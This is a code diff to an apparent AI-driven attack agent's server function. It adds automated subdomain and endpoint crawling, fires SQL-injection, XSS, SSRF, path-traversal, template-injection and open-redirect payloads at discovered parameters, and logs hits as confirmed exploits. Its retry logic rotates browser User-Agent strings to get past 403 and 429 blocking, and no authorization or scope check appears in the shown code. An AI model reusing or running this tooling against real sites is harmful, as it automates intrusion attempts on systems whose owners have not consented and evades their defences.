@@ -401,6 +401,7 @@ serve(async (req) => {
 
         const result = await executeContinuousOperation(agentState, objective, config, authHeader, supabase, userId);
 
+        // Record to attack_chains
         await supabase.from('attack_chains').insert({
           user_id: userId,
           target,
@@ -413,6 +414,27 @@ serve(async (req) => {
             learning_updates: result.learning_updates
           }
         });
+
+        // Record all findings to attack_attempts with proper success status
+        const attemptInserts = result.findings.map((f: Finding) => ({
+          user_id: userId,
+          target: f.subdomain || target,
+          attack_type: f.type || 'scan',
+          technique: f.tool_used || f.phase || 'unknown',
+          success: f.verified === true || f.exploit_confirmed === true || (f.severity !== 'info' && (f.confidence || 0) >= 0.5),
+          payload: f.poc_data || f.evidence?.raw?.poc || null,
+          output: f.description?.slice(0, 500) || null,
+          metadata: { severity: f.severity, confidence: f.confidence, phase: f.phase, cve: f.cve_id } as any,
+        }));
+        
+        if (attemptInserts.length > 0) {
+          try {
+            // Insert in batches of 20
+            for (let i = 0; i < attemptInserts.length; i += 20) {
+              await supabase.from('attack_attempts').insert(attemptInserts.slice(i, i + 20));
+            }
+          } catch (e) { console.warn('[attack_attempts] Insert failed:', e); }
+        }
 
         return new Response(JSON.stringify({
           success: true,
@@ -428,6 +450,7 @@ serve(async (req) => {
         const { target, phase } = data;
         const phaseResult = await executePhase(phase, target, authHeader);
         
+        // Record to ai_learnings
         try {
           await supabase.from('ai_learnings').insert({
             user_id: userId,
@@ -441,8 +464,22 @@ serve(async (req) => {
               ? `${phase} effective - found ${phaseResult.findings.map((f: any) => f.type).join(', ')}`
               : `${phase} yielded no findings - consider expanding scan scope or adjusting parameters`
           });
-        } catch (e) {
-          console.warn('[AI Learning] Failed to record:', e);
+        } catch (e) { console.warn('[AI Learning] Failed to record:', e); }
+
+        // Record each finding to attack_attempts with proper success flag
+        if (phaseResult.findings?.length > 0) {
+          try {
+            const attempts = phaseResult.findings.map((f: any) => ({
+              user_id: userId,
+              target: f.subdomain || target,
+              attack_type: f.type || phase,
+              technique: f.tool_used || phase,
+              success: f.verified === true || f.exploit_confirmed === true || (f.severity !== 'info' && (f.confidence || 0) >= 0.5),
+              output: f.description?.slice(0, 500) || null,
+              metadata: { severity: f.severity, confidence: f.confidence, phase } as any,
+            }));
+            await supabase.from('attack_attempts').insert(attempts);
+          } catch (e) { console.warn('[attack_attempts] Insert failed:', e); }
         }
         
         return new Response(JSON.stringify({ success: true, phase, ...phaseResult }), {
@@ -558,6 +595,15 @@ serve(async (req) => {
         });
       }
 
+      case 'spider-crawl': {
+        // Deep spider mode: crawl all endpoints, params, subdomains
+        const { target: spiderTarget, depth = 3 } = data;
+        const spiderResult = await spiderCrawlTarget(spiderTarget, depth, authHeader, supabase, userId);
+        return new Response(JSON.stringify({ success: true, ...spiderResult }), {
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+        });
+      }
+
       case 'fine-tune-model': {
         const { training_data, model_type } = data;
         const fineTuningResult = await fineTuneAgentModel(training_data, model_type);
@@ -579,9 +625,18 @@ serve(async (req) => {
   }
 });
 
-// ===== Security Scan Integration =====
+// ===== Security Scan Integration with Retry + Strategy Rotation =====
 
-async function callSecurityScan(scanType: string, target: string, authHeader: string): Promise<any> {
+const USER_AGENTS = [
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/125.0.0.0',
+  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
+];
+
+async function callSecurityScan(scanType: string, target: string, authHeader: string, retryCount = 0): Promise<any> {
+  const maxRetries = 3;
   try {
     const controller = new AbortController();
     const timeout = setTimeout(() => controller.abort(), 25000);
@@ -589,20 +644,39 @@ async function callSecurityScan(scanType: string, target: string, authHeader: st
       method: 'POST',
       headers: {
         'Authorization': authHeader, 'Content-Type': 'application/json', 'apikey': SUPABASE_ANON_KEY,
+        'User-Agent': USER_AGENTS[retryCount % USER_AGENTS.length],
       },
-      body: JSON.stringify({ scanType, target, options: {} }),
+      body: JSON.stringify({ scanType, target, options: { retry: retryCount } }),
       signal: controller.signal,
     });
     clearTimeout(timeout);
     if (!response.ok) {
       const errorText = await response.text();
+      // Retry with strategy rotation on 403/429
+      if ((response.status === 403 || response.status === 429) && retryCount < maxRetries) {
+        console.log(`[security-scan ${scanType}] ${response.status}, retrying (${retryCount + 1}/${maxRetries})...`);
+        await new Promise(r => setTimeout(r, 1000 * (retryCount + 1) + Math.random() * 2000));
+        return callSecurityScan(scanType, target, authHeader, retryCount + 1);
+      }
       console.warn(`[security-scan ${scanType}] ${response.status}: ${errorText}`);
       return { success: false, error: errorText, scanType, target };
     }
-    return await response.json();
-  } catch (error) {
+    const result = await response.json();
+    // If zero findings and retries left, try again with different strategy
+    const findings = result.findings || result.vulnerabilities || [];
+    if (findings.length === 0 && retryCount < maxRetries && ['sqli', 'xss', 'lfi', 'ssrf'].includes(scanType)) {
+      console.log(`[security-scan ${scanType}] 0 findings, retrying with rotation (${retryCount + 1}/${maxRetries})...`);
+      await new Promise(r => setTimeout(r, 500 + Math.random() * 1000));
+      return callSecurityScan(scanType, target, authHeader, retryCount + 1);
+    }
+    return result;
+  } catch (error: any) {
     if (error.name === 'AbortError') {
-      return { success: false, error: 'Scan timed out', scanType, target };
+      if (retryCount < maxRetries) {
+        console.log(`[security-scan ${scanType}] Timeout, retrying (${retryCount + 1}/${maxRetries})...`);
+        return callSecurityScan(scanType, target, authHeader, retryCount + 1);
+      }
+      return { success: false, error: 'Scan timed out after retries', scanType, target };
     }
     return { success: false, error: error.message, scanType, target };
   }
@@ -1935,4 +2009,139 @@ async function getPhaseStrategy(phase: string, target: string, objective: string
     if (jsonMatch) return JSON.parse(jsonMatch[0]);
   } catch {}
   return { strategy: 'default' };
+}
+
+// ===== SPIDER CRAWL: Deep endpoint/param/subdomain discovery =====
+async function spiderCrawlTarget(
+  target: string, depth: number, authHeader: string, supabase: any, userId: string
+): Promise<{
+  endpoints: string[]; parameters: string[]; subdomains: string[];
+  findings: Finding[]; output: string[];
+}> {
+  const output: string[] = [];
+  const endpoints = new Set<string>();
+  const parameters = new Set<string>();
+  const findings: Finding[] = [];
+  const startTime = Date.now();
+
+  output.push(`[SPIDER] Starting deep crawl of ${target} (depth: ${depth})`);
+
+  // Step 1: Subdomain enumeration
+  const subdomains = await enumerateSubdomains(target, authHeader);
+  output.push(`[SPIDER] Found ${subdomains.length} subdomains`);
+
+  // Step 2: Directory/endpoint discovery on main + subdomains
+  const allTargets = [target, ...subdomains.slice(0, 20)];
+  const dirScanTypes = ['directory', 'tech', 'headers'];
+  
+  for (const t of allTargets) {
+    for (const scanType of dirScanTypes) {
+      try {
+        const result = await callSecurityScan(scanType, t, authHeader);
+        if (result.success !== false) {
+          const scanFindings = extractFindings(result, scanType, 'spider', t);
+          findings.push(...scanFindings);
+          
+          // Extract endpoints from findings
+          for (const f of scanFindings) {
+            if (f.evidence?.raw?.url) endpoints.add(f.evidence.raw.url);
+            if (f.evidence?.raw?.path) endpoints.add(`${t}${f.evidence.raw.path}`);
+            if (f.evidence?.raw?.parameter) parameters.add(f.evidence.raw.parameter);
+          }
+        }
+      } catch {}
+    }
+  }
+
+  // Step 3: Common parameter extraction
+  const commonParams = ['id', 'q', 'search', 'page', 'url', 'file', 'path', 'redirect', 'callback',
+    'next', 'return', 'ref', 'token', 'key', 'user', 'email', 'name', 'action', 'cmd', 'type',
+    'sort', 'order', 'filter', 'category', 'lang', 'debug', 'test', 'admin', 'api_key'];
+  commonParams.forEach(p => parameters.add(p));
+
+  // Step 4: Test each parameter on each endpoint with OWASP-mapped payloads
+  const OWASP_PAYLOADS: Record<string, { payload: string; category: string }[]> = {
+    'id': [
+      { payload: "' OR 1=1--", category: 'A03-Injection' },
+      { payload: "1 UNION SELECT null,version()--", category: 'A03-Injection' },
+      { payload: "../../../etc/passwd", category: 'A01-Broken-Access' },
+    ],
+    'q': [
+      { payload: '<script>alert(1)</script>', category: 'A03-Injection' },
+      { payload: "{{7*7}}", category: 'A03-Injection' },
+    ],
+    'url': [
+      { payload: 'http://127.0.0.1:80', category: 'A10-SSRF' },
+      { payload: 'file:///etc/passwd', category: 'A01-Broken-Access' },
+    ],
+    'redirect': [
+      { payload: 'https://evil.com', category: 'A01-Broken-Access' },
+      { payload: '//evil.com', category: 'A01-Broken-Access' },
+    ],
+    'file': [
+      { payload: '../../../../etc/passwd', category: 'A01-Broken-Access' },
+      { payload: 'php://filter/convert.base64-encode/resource=index.php', category: 'A03-Injection' },
+    ],
+  };
+
+  output.push(`[SPIDER] Discovered ${endpoints.size} endpoints, ${parameters.size} parameters`);
+  output.push(`[SPIDER] Running OWASP-mapped payload tests...`);
+
+  // Test critical params with OWASP payloads
+  for (const [param, payloads] of Object.entries(OWASP_PAYLOADS)) {
+    if (!parameters.has(param)) continue;
+    for (const { payload, category } of payloads) {
+      try {
+        const response = await fetch(`${SUPABASE_URL}/functions/v1/attack-execution-loop`, {
+          method: 'POST',
+          headers: { 'Authorization': authHeader, 'Content-Type': 'application/json', 'apikey': SUPABASE_ANON_KEY },
+          body: JSON.stringify({
+            target, payloads: [{ raw: payload, encoded: encodeURIComponent(payload),
+              attackType: category, parameter: param, injectionPoint: 'query' }],
+            maxRetries: 3, techStack: [],
+          }),
+        });
+        if (response.ok) {
+          const result = await response.json();
+          if (result.successCount > 0) {
+            findings.push({
+              id: crypto.randomUUID(), type: category, severity: 'high',
+              title: `[SPIDER] ${category} via ?${param}=`,
+              description: `Spider found ${category} vulnerability on parameter "${param}"`,
+              evidence: { raw: { parameter: param, payload, poc: payload }, owasp: category },
+              timestamp: new Date().toISOString(), phase: 'spider',
+              tool_used: 'spider-crawler', exploitable: true,
+              exploit_confirmed: true, confidence: 0.9, verified: true,
+              poc_data: `OWASP: ${category}\nParam: ${param}\nPayload: ${payload}`,
+            });
+            output.push(`[SPIDER] ✅ ${category} on ?${param} — CONFIRMED`);
+          }
+        }
+      } catch {}
+    }
+  }
+
+  // Record to attack_attempts
+  if (findings.length > 0) {
+    try {
+      await supabase.from('attack_attempts').insert(
+        findings.map(f => ({
+          user_id: userId, target: f.subdomain || target,
+          attack_type: f.type, technique: 'spider-crawler',
+          success: true, output: f.description?.slice(0, 500),
+          metadata: { severity: f.severity, owasp: f.evidence?.owasp } as any,
+        }))
+      );
+    } catch {}
+  }
+
+  output.push(`[SPIDER] Complete: ${findings.length} findings in ${Date.now() - startTime}ms`);
+
+  return {
+    endpoints: Array.from(endpoints),
+    parameters: Array.from(parameters),
+    subdomains,
+    findings: deduplicateFindings(findings),
+    output,
+  };
 }
